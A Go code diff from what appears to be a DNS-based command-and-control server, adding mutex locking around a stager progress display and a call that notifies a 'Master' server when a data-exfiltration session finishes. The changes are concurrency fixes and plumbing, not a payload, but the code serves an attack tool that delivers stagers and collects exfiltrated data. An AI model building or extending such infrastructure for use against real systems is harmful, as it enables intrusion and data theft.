@@ -400,13 +400,17 @@ func renderProgressBar(current, total int, eta string, clientIP string) string {
 }
 
 // startProgressUpdater starts a goroutine that continuously updates the progress bar
+// Caller must NOT hold c2.mutex when calling this function.
 func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
+	c2.mutex.Lock()
 	if session.ProgressRunning {
+		c2.mutex.Unlock()
 		return // Already running
 	}
 
 	session.ProgressRunning = true
 	session.ProgressDone = make(chan bool)
+	c2.mutex.Unlock()
 
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
@@ -438,6 +442,7 @@ func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP strin
 }
 
 // stopProgressUpdater stops the progress updater goroutine
+// Caller must hold c2.mutex when calling this function.
 func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
 	if session.ProgressRunning && session.ProgressDone != nil {
 		close(session.ProgressDone)
@@ -458,7 +463,9 @@ func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, c
 		c2.startProgressUpdater(session, clientIP)
 	} else if current == session.TotalChunks {
 		// Final chunk - stop updater and print completion
+		c2.mutex.Lock()
 		c2.stopProgressUpdater(session)
+		c2.mutex.Unlock()
 		elapsed := time.Since(session.StartedAt)
 		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
 			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
@@ -1389,7 +1396,7 @@ func (c2 *C2Manager) processSessionPendingChunks(session *ExfilSession) {
 	}
 }
 
-// finalizeExfilSession marks a session as complete locally
+// finalizeExfilSession marks a session as complete locally and notifies Master
 func (c2 *C2Manager) finalizeExfilSession(session *ExfilSession) {
 	c2.mutex.Lock()
 	if session.Status == "completed" {
@@ -1401,6 +1408,25 @@ func (c2 *C2Manager) finalizeExfilSession(session *ExfilSession) {
 	c2.mutex.Unlock()
 
 	c2.persistExfilSession(session)
+
+	// Notify Master to trigger artifact assembly
+	if masterClient != nil {
+		go func(s *ExfilSession) {
+			req := ExfilCompleteRequest{
+				DNSServerID: masterClient.serverID,
+				APIKey:      masterClient.apiKey,
+				SessionID:   s.SessionID,
+				TotalChunks: int(s.TotalChunks),
+			}
+			if err := masterClient.MarkExfilComplete(req); err != nil {
+				if c2.debug {
+					logf("[Exfil] Failed to notify Master of completion for session %s: %v", s.SessionID, err)
+				}
+			} else if c2.debug {
+				logf("[Exfil] Notified Master of completion for session %s", s.SessionID)
+			}
+		}(session)
+	}
 
 	if c2.debug {
 		logf("[Exfil] Finalized session %s (local status=completed)", session.SessionID)
